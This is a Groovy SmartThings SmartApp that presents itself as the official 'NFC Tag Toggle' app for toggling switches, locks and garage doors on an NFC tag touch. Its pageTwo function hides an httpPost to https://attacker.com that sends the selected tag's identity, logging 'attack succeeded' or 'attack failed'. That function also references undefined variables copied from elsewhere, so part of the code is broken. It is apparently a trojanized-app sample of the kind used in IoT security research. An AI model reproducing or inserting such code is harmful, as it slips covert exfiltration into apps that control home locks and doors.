

definition(
    name:"NFC Tag Toggle",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Allows toggling of a switch,lock,or garage door based on an NFC Tag touch event",
    category:"SmartThings Internal",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Developers/nfc-tag-executor.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Developers/nfc-tag-executor@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Developers/nfc-tag-executor@2 x.png")


preferences{
    page(name:"pageOne",title:"Device selection",uninstall:true,nextPage:"pageTwo"){
        section("Select an NFC tag"){
            input"tag","capability.touchSensor",title:"NFC Tag"
            }
        section("Select devices to control"){
            input"switch1","capability.switch",title:"Light or switch",required:false,multiple:true
            input"lock","capability.lock",title:"Lock",required:false,multiple:true
            input"garageDoor","capability.doorControl",title:"Garage door controller",required:false,multiple:true
            }
        }
    
    page(name:"pageTwo",title:"Master devices",install:true,uninstall:true)
}

def pageTwo(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(master){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${tag}"
        ]
        ]
        result=devices.find{it.id==master}?.currentValue(attribute)
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hi"
            ]
            ]
            def map=[:]
            devices.each{
                def value=it.currentValue(attribute)
                map[value]=(map[value]?:0)+1
                log.trace"$it.displayName:$value"
                }
            log.trace map
            result=map.collect{it}.sort{it.value}[-1].key
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe tag,"nfcTouch",touchHandler
    subscribe app,touchHandler
}

private currentStatus(devices,master,attribute){
    log.trace"currentStatus($devices,$master,$attribute)"
    def result=null
    if(master){
        result=devices.find{it.id==master}?.currentValue(attribute)
    }
    else{
            def map=[:]
            devices.each{
                def value=it.currentValue(attribute)
                map[value]=(map[value]?:0)+1
                log.trace"$it.displayName:$value"
                }
            log.trace map
            result=map.collect{it}.sort{it.value}[-1].key
        }
    log.debug"$attribute=$result"
    result
}

def touchHandler(evt){
    log.trace"touchHandler($evt.descriptionText)"
    if(switch1){
        def status=currentStatus(switch1,masterSwitch,"switch")
        switch1.each{
            if(status=="on"){
                it.off()
            }
            else{
                    it.on()
                }
            }
    }
    
    if(lock){
        def status=currentStatus(lock,masterLock,"lock")
        lock.each{
            if(status=="locked"){
                lock.unlock()
            }
            else{
                    lock.lock()
                }
            }
    }
    
    if(garageDoor){
        def status=currentStatus(garageDoor,masterDoor,"status")
        garageDoor.each{
            if(status=="open"){
                it.close()
            }
            else{
                    it.open()
                }
            }
    }
}

